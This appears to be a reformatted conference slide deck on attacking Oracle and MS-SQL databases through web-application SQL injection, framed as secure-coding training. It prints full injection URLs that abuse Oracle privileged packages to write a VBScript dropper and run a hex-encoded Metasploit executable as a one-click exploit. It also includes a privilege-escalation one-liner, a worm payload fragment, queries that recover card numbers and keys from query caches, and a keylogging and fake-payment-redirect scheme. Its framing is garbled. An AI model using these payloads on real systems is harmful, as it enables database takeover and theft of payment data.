# 7Safe Company Overview 2009
## Secure Coding Course, © 7Safe
### Date: 6/11/2010
### Topic: Hacking Oracle from Web Applications

---

### Session 71: Hacking Oracle from Web Applications

**Hexadecimal Data:**
```
F2AE55FF962C60x0209C07407890383C304EBE1FF963C60x028BAE3060x028DBE00F0FFFFBB0010x0250546A045357FFD58D879F
01x0280207F8060287F585054505357FFD558618D4424806A0039C475FA83EC80E938ACFFFFx444470x022870x165070x025E70x026E70x027E70x028C70x029A70x064B45524E454C33322E444C4Cx024C6F61644C69627261727941x0247657450726F6341646472657373x025669727475616C50726F74656374x025669727475616C416C6C6F63x025669727475616C46726565x034578697450726F63657373xFFx5A":W CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2) ^%26 "\wr.exe", R(d):Function R(t):Dim 
Arr():For i=0 To Len(t)-1 Step 2:Redim Preserve Ar(S):FB=Mid(t,i%2b1,1):SB=Mid(t,i%2b2,1):HX=FB ^%26 SB:If FB="x" 
Then:NB=Mid(t,i%2b3,1):L=H(SB ^%26 NB):For j=0 To L:Redim Preserve 
Ar(S%2b(j*2)%2b1):Ar(S%2bj)=0:Ar(S%2bj%2b1)=0:Next:i=i%2b1:S=S%2bL:Else:If Len(HX)^>0 Then:Ar(S)=H(HX):End 
If:S=S%2b1:End If:Next:Redim Preserve Ar(S-2):R=Ar:End Function:Function H(HX):H=CLng("%26H" ^%26 HX):End Function:Sub
W(FN, Buf):Dim aBuf:Size = UBound(Buf):ReDim aBuf(Size\2):For I = 0 To Size - 1 Step 
2:aBuf(I\2)=ChrW(Buf(I%2b1)*256%2bBuf(I)):Next:If I=Size Then:aBuf(I\2)=ChrW(Buf(I)):End If:aBuf=Join(aBuf,""):Set 
bS=CreateObject("ADODB.Stream"):bS.Type=1:bS.Open:With CreateObject("ADODB.Stream"):.Type=2:.Open:.WriteText 
aBuf:.Position=2:.CopyTo bS:.Close:End With:bS.SaveToFile FN,2:bS.Close:Set bS=Nothing:End
Sub>%25TEMP%25\bsqlbf.vbs%26%26%25TEMP%25\bsqlbf.vbs%26%26%25TEMP%25\wr.exe') FROM DUAL) is not null--
```

**Discussion:**

- **Dan Haagman, InfoSecurity 2009:**
  - **Question:** Can you not grant user Java IO privileges and then execute the step described earlier?
  - **Answer:** We can, but the privileges will not be available in the same session. It won't be a one-click exploit with DBA privileges.

- **What didn’t work:**
  - Can you not pass the OS code directly to `DBMS_SCHEDULER` and execute it, simple!?
  - The `DBMS_SCHEDULER`'s `create program` procedure can only take up to 1000 characters as an argument to the `program_action` parameter.

- **What finally worked:**
  - Create a directory.
  - Create a procedure to write files on the system.
  - Execute the procedure to write a VB script.
  - Execute the VB script to create `msfpayload`'s executable.
  - Execute the executable.
  - All in one request? ☺

**Example:**
```sql
http://vuln.com/vulnerable.php?name=1 and (SELECT SYS.KUPP$PROC.CREATE_MASTER_PROCESS('BEGIN EXECUTE IMMEDIATE ''create or 
replace procedure pr(p in varchar2,fn in varchar2,l in nvarchar2) is o_f utl_file.file_type; begin 
o_f:=utl_file.fopen(p,fn,''''W'''',4000);utl_file.put_line(o_f,l);utl_file.fclose(o_f);end;'';execute immediate ''create or replace directory T as 
''''C:\'''''';pr(''T'',''x.vbs'',''d="4D5A900003x0304x03FFFFx02B8x0740x2380x030E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2
063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A24x075045x024C01030049783A29x08E0000F030B0102380002x0322
x0710x0310x0840x0210x0302x0204x0301x0304x0850x0302x0275F9x0202x0520x0210x0410x0210x0610x0C40x0284x732E74657874x0360x04
10x0302x0302x0E20x02602E7264617461x0320x0320x0320x0304x0E40x02402E6964617461x0284x0440x0302x0324x0E40x02C0x1031C0B9002
04000683010400064FF30648920506A40680020x025151E91Fx03909090909090909090909090909090FF253C4040009090x08FF254040400090
90x08FFFFFFFFx04FFFFFFFFxFFxA5FCE856x03535556578B6C24188B453C8B54057801EA8B4A188B5A2001EBE332498B348B01EE31FFFC31C0AC
38E07407C1CF0D01C7EBF23B7C241475E18B5A2401EB668B0C4B8B5A1C01EB8B048B01E8EB0231C05F5E5D5BC208005E6A3059648B198B5B0
C8B5B1C8B1B8B5B0853688E4E0EECFFD689C7536854CAAF91FFD681EC0001x025057565389E5E81Fx039001x02B61918E7A41970E9ECF9AA60D
909F5ADCBEDFC3B5753325F3332005B8D4B1851FFD789DF89C38D75146A05595153FF348FFF55045989048EE2F22B2754FF37FF552831C05050
505040504050FF552489C768C0A80253680200115C89E16A105157FF55206A405E56C1E60656C1E608566A00FF550C89C36A00565357FF5518F
FD3xFFxFFxFFxFFxFFxFFxFFxFFxFFxFFxFFxFFxFFxFFxFFxFFxFFxFFxFFxFFxFFxFFxFFxFFxFFxFFxFFxFFxFFxFFxFFxFFx092C40x0A7440x023C40x1A4840x02
5840x0A4840x025840x069C004578697450726F63657373x031E035669727475616C50726F74656374x0540x0340x024B45524E454C33322E646
L6CxFFx81":W "C:\wr.exe", R(d):Function R(t):Dim Arr():For i=0 To Len(t)-1 Step 2:Redim Preserve 
Ar(S):FB=Mid(t,i%2b1,1):SB=Mid(t,i%2b2,1):HX=FB %26 SB:If FB="x" Then:NB=Mid(t,i%2b3,1):L=H(SB %26 NB):For j=0 To L:Redim Preserve 
Ar(S%2b(j*2)%2b1):Ar(S%2bj)=0:Ar(S%2bj%2b1)=0:Next:i=i%2b1:S=S%2bL:Else:If Len(HX)>0 Then:Ar(S)=H(HX):End If:S=S%2b1:End If:Next:Redim
Preserve Ar(S-2):R=Ar:End Function:Function H(HX):H=CLng("%26H" %26 HX):End Function:Sub W(FN, Buf):Dim aBuf:Size = UBound(Buf):ReDim
aBuf(Size\2):For I = 0 To Size - 1 Step 2:aBuf(I\2)=ChrW(Buf(I%2b1)*256%2bBuf(I)):Next:If I=Size Then:aBuf(I\2)=ChrW(Buf(I)):End 
If:aBuf=Join(aBuf,""):Set bS=CreateObject("ADODB.Stream"):bS.Type=1:bS.Open:With CreateObject("ADODB.Stream"):.Type=2:.Open:.WriteText 
aBuf:.Position=2:.CopyTo bS:.Close:End With:bS.SaveToFile FN,2:bS.Close:Set bS=Nothing:End Sub'');DBMS_SCHEDULER.create_program(''bb'', 
''EXECUTABLE'', ''c:\WINDOWS\system32\cmd.exe /c 
C:\x.vbs%26%26C:\wr.exe'',0,TRUE);DBMS_SCHEDULER.create_job(''au'',''bb'',enabled=>TRUE);END;') from dual) is not null--
```

**Demo: One-Click Exploit**

**Session 72: Executing DDL/DML**

- **SQL Injection Example:**
  ```sql
  select 
  SYS.KUPP$PROC.CREATE_MASTER_PROCESS('begin execute immediate ''grant dba to foobar'';end;')from dual;
  ```

**Session 73: SQL Injection Worm**

- **Started almost 2 years ago:**
  - Changes the web app frontend.
  - Injects malicious JavaScript within iframes of the frontend.
  - Distributes browser exploits.
  - Similar worms can be written in Oracle based on the concepts shown earlier.

**Session 74: SQL Injection Worm in MS-SQL**

- **Example:**
  ```sql
  s=290';DECLARE @S NVARCHAR(4000);=CAST(0x
  ```

**Session 75: Protecting Sensitive Data in Databases**

- **PCI Compliance:**
  - Mandates that card data (PAN) must be stored encrypted.
  - The distribution of keys used for encryption/decryption should be regulated.

- **Vulnerabilities:**
  - What happens when an attacker finds a SQL injection in such a site?
    - Card data is encrypted.
    - Attacker can’t get keys for decryption.

- **Hashed Credit Card Numbers:**
  - No regulation on where encryption occurs.
  - If encryption occurs in the database:
    ```sql
    $query = "INSERT INTO shop_creditcards (user_id, card_type, card_number, valid_to, enabled) VALUES ($userID, $cardType, (select rawtohex(utl_raw.cast_to_raw(dbms_obfuscation_toolkit.DES3Encrypt(input_string=>$cardNumber, key_string=>$cardEncryptionKey))) from dual), $validTo, 1)";
    ```

- **Forensic Queries:**
  - `v$sql` in Oracle lists statistics on shared SQL area.
  - Typically stores the last 500 queries.
  - Sometimes the data from `v$SQL` gets written to `WRH$_SQLTEXT`.

- **Example:**
  ```sql
  >Select sql_text from V$SQL
  ------------------------------------------------------------
  INSERT INTO shop_creditcards (user_id, card_type, card_number, valid_to, enabled) VALUES ('2', '2', (select rawtohex(utl_raw.cast_to_raw(dbms_obfuscation_toolkit.DES3Encrypt(input_string=>'4918129821080021', key_string=>'ihPJlkqsJJXIdcM1rjVaHkkI7cd42gNgzHn8'))) from dual), '01-JAN-2012', '1')
  W00t!
  ```

- **Plan Cache in MS-SQL:**
  ```sql
  SELECT st.text, stat.creation_time, stat.last_execution_time FROM sys.dm_exec_cached_plans AS plans OUTER APPLY sys.dm_exec_sql_text(plan_handle) AS st JOIN sys.dm_exec_query_stats AS stat ON stat.plan_handle = plans.plan_handle WHERE cacheobjtype = 'Compiled Plan' ORDER BY stat.last_execution_time DESC
  ```

- **Encryption/Hashing within the Database:**
  - Sensitive data in the plan cache can be exposed.
  - What if the attacker poisons the session data?
    - Session data now contains malicious JavaScript.
    - JavaScript logs keystrokes and sends them to the attacker’s server.
    - Who needs the encryption keys!! Change the page (via JavaScript) so that users get redirected to fake third-party payment servers and then redirect back to original gateways.

**Demo: Video**

**References:**
- Thank You

---

This document has been optimized for clarity, coherence, and professionalism.